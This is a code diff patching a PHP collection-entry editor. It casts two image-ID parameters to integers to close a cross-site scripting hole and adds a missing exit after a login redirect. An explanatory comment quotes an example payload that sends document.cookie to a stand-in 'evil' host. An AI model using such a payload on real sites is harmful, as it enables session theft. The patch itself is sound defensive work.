@@ -123,6 +123,34 @@ if(!is_numeric($tabTarget)) $tabTarget = 0;
 if(!is_numeric($goToMode)) $goToMode = 0;
 if(!is_numeric($occIndex)) $occIndex = false;
 if(!is_numeric($crowdSourceMode)) $crowdSourceMode = 0;
+// Both are media IDs / offsets, so both must be numeric. They were missing from
+// this block while every other request value was covered, and both reach output
+// sinks that are NOT escaped:
+//   :580   var activeImgIndex = <?php echo $currentImgId; ?>;      (inline <script>)
+//   :1096  <input ... value="<?php echo $currentImgIndex; ?>">     (attribute)
+//   :1109 / :1118  navigateToRecordNew(... $currentImgIndex ...)   (inline JS args)
+//   quickentryimgprocessor.php:108 / :132 via $imgId = $currentImgId (:1159)
+// so e.g. ?imgid=0;fetch('https://evil/?c='+document.cookie)// executed attacker
+// JS in an authenticated editor's session.
+//
+// Coercing here rather than escaping at each sink: it is one guard instead of
+// six, it cannot be forgotten when a seventh sink is added, and a numeric value
+// is safe in every one of those contexts (inline JS, attribute, and JS argument
+// list) whereas htmlspecialchars alone is not safe inside <script>.
+//
+// 0 rather than '' when absent, because :580 emits the value as a bare JS
+// literal -- an empty string renders `var activeImgIndex = ;`, a SyntaxError
+// that kills the whole inline script block and silently breaks the OCR and
+// record-navigation buttons. No code branches on $currentImgId being falsy, and
+// mediaID is never 0, so 0 behaves as "no image" exactly as null did.
+//
+// Cast to int rather than leaving the numeric string as-is: is_numeric() accepts
+// forms that are legal PHP numbers but not the JS integer literal these sinks
+// assume. '007' would emit `var activeImgIndex = 007;` -- a legacy octal literal,
+// which is a SyntaxError under strict mode -- and '1e3' would silently become
+// 1000. Both are media IDs, so an int is the only shape that makes sense.
+$currentImgId = is_numeric($currentImgId) ? (int) $currentImgId : 0;
+$currentImgIndex = is_numeric($currentImgIndex) ? (int) $currentImgIndex : 0;
 $action = htmlspecialchars(strip_tags($action), ENT_QUOTES, 'UTF-8');
 
 $displayQuery = 0;
@@ -560,6 +588,11 @@ else{
 	$q = isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '';
 	$ref = '../collections/quickentry/occurrencequickentry.php' . ($q ? ('?' . $q) : '');
 	header('Location: ../../profile/index.php?refurl=' . rawurlencode($ref));
+	// header() only queues a status line; without exit PHP carries on and renders
+	// the entire page body below, which is sent along with the 302 and is
+	// readable by any client that does not follow redirects -- so the editor UI
+	// was being served to unauthenticated callers.
+	exit;
 }
 ?>
 <html>
